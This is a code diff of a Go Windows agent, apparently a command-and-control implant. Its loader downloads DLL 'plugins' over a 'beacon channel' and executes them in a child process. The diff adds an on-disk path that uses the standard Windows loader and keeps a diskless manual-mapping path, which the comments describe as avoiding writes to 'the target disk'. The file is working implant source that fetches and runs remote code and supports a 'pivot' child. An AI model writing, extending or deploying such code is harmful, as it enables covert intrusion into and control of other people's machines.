@@ -1,11 +1,11 @@
 //go:build windows
 
-// Diskless PE plugin loader.
+// PE plugin host with an opt-in standard Windows loader path.
 //
 // Plugins are DLL images fetched over the authenticated beacon channel and
-// manually mapped into a dedicated child process. Nothing is ever written to
-// the target disk: the bytes stay in memory from the HTTP response to the
-// mapped image. A writable staging allocation is copied into a separate image
+// loaded into a dedicated child process. DLLs that export the Windows-loader
+// marker are staged on disk until the child exits. Other DLLs retain the
+// manual mapper: a writable staging allocation is copied into a separate image
 // allocation before per-section protections are applied.
 //
 // Only PE32+ amd64 images are supported. Manually mapped modules are not
@@ -69,7 +69,7 @@ func loadPluginPE(client *http.Client, cfg *config, url, exportName, input strin
 // loadPluginPEContext is the persistent form used by channel plugins. The
 // caller owns cancellation so a long-lived pivot child cannot outlive the
 // beacon process during shutdown.
-func loadPluginPEContext(ctx context.Context, client *http.Client, cfg *config, url, exportName, input string) (string, error) {
+func loadPluginPEContext(ctx context.Context, client *http.Client, cfg *config, url, exportName, input string) (result string, resultErr error) {
 	if runtime.GOARCH != "amd64" {
 		return "", errors.New("PE plugins require the windows/amd64 agent build")
 	}
@@ -77,14 +77,31 @@ func loadPluginPEContext(ctx context.Context, client *http.Client, cfg *config, 
 	if err != nil {
 		return "", fmt.Errorf("plugin download failed: %w", err)
 	}
-	var frame bytes.Buffer
-	_ = binary.Write(&frame, binary.LittleEndian, uint32(len(data)))
-	_ = binary.Write(&frame, binary.LittleEndian, uint32(len(input)))
-	_, _ = frame.Write(data)
-	_, _ = frame.WriteString(input)
-
-	cmd := exec.CommandContext(ctx, os.Args[0], "--plugin-child", exportName)
-	cmd.Stdin = &frame
+	if len(data) == 0 || len(data) > 512*1024*1024 || len(input) > 4096 || !pluginExportPattern.MatchString(exportName) {
+		return "", errors.New("invalid plugin size, input size, or export name")
+	}
+	useWindowsLoader, err := pluginRequiresWindowsLoader(data)
+	if err != nil {
+		return "", err
+	}
+	var cmd *exec.Cmd
+	if useWindowsLoader {
+		path, cleanup, err := stageWindowsPlugin(data)
+		if err != nil {
+			return "", err
+		}
+		defer func() { resultErr = errors.Join(resultErr, cleanup()) }()
+		cmd = exec.CommandContext(ctx, os.Args[0], "--plugin-library-child", exportName, path)
+		cmd.Stdin = strings.NewReader(input)
+	} else {
+		var frame bytes.Buffer
+		_ = binary.Write(&frame, binary.LittleEndian, uint32(len(data)))
+		_ = binary.Write(&frame, binary.LittleEndian, uint32(len(input)))
+		_, _ = frame.Write(data)
+		_, _ = frame.WriteString(input)
+		cmd = exec.CommandContext(ctx, os.Args[0], "--plugin-child", exportName)
+		cmd.Stdin = &frame
+	}
 	var stdout, stderr bytes.Buffer
 	cmd.Stdout = &stdout
 	cmd.Stderr = &stderr
@@ -407,6 +424,11 @@ func callPluginExport(base uintptr, exportName, input string) (string, error) {
 	if err != nil {
 		return "", err
 	}
+	return invokePluginExport(addr, exportName, input)
+}
+
+// invokePluginExport implements the shared bounded Run ABI for either loader.
+func invokePluginExport(addr uintptr, exportName, input string) (string, error) {
 	inputBytes := make([]byte, len(input)+1)
 	copy(inputBytes, input)
 	output := make([]byte, pluginOutputBytes)
